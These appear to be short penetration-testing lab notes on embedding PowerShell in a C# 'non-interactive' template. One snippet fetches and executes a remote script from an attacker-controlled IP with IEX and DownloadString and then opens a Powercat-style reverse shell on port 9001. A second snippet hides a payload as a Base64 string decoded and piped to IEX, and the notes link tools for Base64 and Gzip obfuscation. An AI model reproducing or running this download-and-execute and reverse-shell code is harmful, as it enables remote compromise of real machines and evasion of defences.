## Notes - Non-Interactive Template

Adding Powercat invoking into the Non-Interactive template is pretty baller for catching a full language shell
```csharp
// Start
string Command = @"
			
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.216/SimpleCat-TCP.ps1') | IEX
SimpleCat-TCP -c 192.168.45.216 -p 9001 -ep
";
//End
```

We can even Base64 encode or Gzip compress entire scripts within the compiled project
- GZIP: https://www.zickty.com/texttogzip
- Base64 (Unicode): https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')&input=d2hvYW1p
```csharp
// Start
 string Command = @"
                                  
$String = 'RgB1AG4AYwB0AGkA'                
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(""$String"")) | IEX                 

 ";
// End
```
